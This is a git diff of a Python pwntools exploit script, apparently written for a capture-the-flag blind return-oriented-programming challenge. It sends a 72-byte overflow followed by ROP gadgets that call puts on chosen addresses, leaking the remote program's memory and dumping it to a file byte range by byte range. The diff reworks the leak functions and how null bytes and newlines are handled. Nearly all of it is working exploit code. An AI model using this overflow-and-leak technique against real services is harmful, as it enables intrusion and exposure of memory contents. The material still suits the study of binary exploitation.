@@ -122,29 +122,6 @@ def find_write_func(addr):
 		log.info("dead connection! at 0x%x" % addr)
 
 
-
-flag = True
-def leak1(p,addr):
-	global flag
-	payload = "A"*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr)
-	if flag:
-		p.recvuntil('WelCome my friend,Do you know password?')
-		p.sendline(payload)
-		p.recvline()
-		data = p.recv()
-		flag = False
-	else:
-		p.sendline(payload)
-		p.recvline()
-		data = p.recv()
-	try:
-		data = data[0:data.index("WelCome")]
-	except ValueError as e:
-		data = data
-	log.info("leaking: 0x%x --> %s" % (addr,(data or '').encode('hex')))
-	return dat
-
-
 def write2file(data):
 	f = open('leak.bin','a')
 	f.write(data)
@@ -159,14 +136,20 @@ def leak(addr):
 	p.sendline(payload)
 	try:
 		p.recvline()
-		data = p.recv().strip()
+		data = p.recvline().strip()
 		if(data != None):
 			try:
 				data = data[0:data.index("WelCome")]
 			except ValueError as e:
 				data = data
+			#if leak data is 0x00
+			if data == "":
+				data = "\x00"
+			#if leak data is end with 0x0a
+			elif(data[len(data)- 1] == '\n' and data[len(data)- 2] == '\n'):
+				data = data.strip()
+				data = data+"\x0a"
 			log.info("leaking: 0x%x --> %s" % (addr,(data or '').encode('hex')))
-			write2file(data)
 			p.close()
 			return data
 	except EOFError as e: 
@@ -174,6 +157,15 @@ def leak(addr):
 		log.info("dead connection! at 0x%x" % addr)
 		return None
 	
+
+def leak1(p,addr):
+	payload = "A"*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr)
+	p.recvuntil('WelCome my friend,Do you know password?')
+	p.sendline(payload)
+	p.recvline() #junk line
+	data = p.recvline()
+	log.info("leaking: 0x%x --> %s" % (addr,(data or '').encode('hex')))
+	return data
 
 def main():
 	'''
@@ -205,11 +197,11 @@ def main():
 	'''
 
 	#dump bin
-	addr = 0x400000
-	#raw_input('#')
+	addr = 0x600000
 	while True:
 		data = leak(addr)
 		addr += len(data)
+		write2file(data)
 
 
 if __name__ == '__main__':
